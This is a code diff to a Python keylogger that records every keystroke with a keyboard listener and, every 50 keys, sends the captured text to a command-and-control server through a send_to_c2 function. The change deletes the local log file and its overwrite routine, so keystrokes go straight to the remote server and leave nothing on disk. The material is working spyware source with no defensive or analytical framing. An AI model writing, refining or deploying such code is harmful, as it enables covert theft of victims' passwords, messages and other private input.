@@ -13,7 +13,7 @@ log_file = "logger.log"
 
 #FUNCTION DEFINITIONS
 def on_press(key):
-	save_to_file(get_mapping(key))
+	get_input(get_mapping(key))
 	if(key == keyboard.Key.esc):
 		sys.exit()
 
@@ -52,30 +52,15 @@ def record_keystrokes():
 		listener.join()
 
 
-def start_logger(log_file_name):
-	logging.basicConfig(level=logging.INFO, filename=log_file_name, filemode='a', format='%(message)s')
-
-# save_to_file and overwrite log use log_file variable as global variable 
-def save_to_file(_input):
+def get_input(_input):
 	global total_input
 	total_input += _input
 	global count
 	count += 1
 	if(count >= 50):
-		logging.info(total_input)
-		with open(log_file, "rb") as f:
-			_output = f.read()
-		f.close()
-		send_to_c2(str(_output))
-		overwrite_log()
+		send_to_c2(str(total_input))
 		count = 0
 		total_input = ""
-
-def overwrite_log(): 
-	#Overwrites the file after so many characters 
-	with open(log_file, "w") as file:
-		file.write("")
-	file.close()
 
 def send_to_c2(_output):
 	try:
@@ -90,6 +75,4 @@ def send_to_c2(_output):
 
 ###########START OF MAIN CODE ##############################33
 
-overwrite_log()
-start_logger(log_file)
 record_keystrokes()
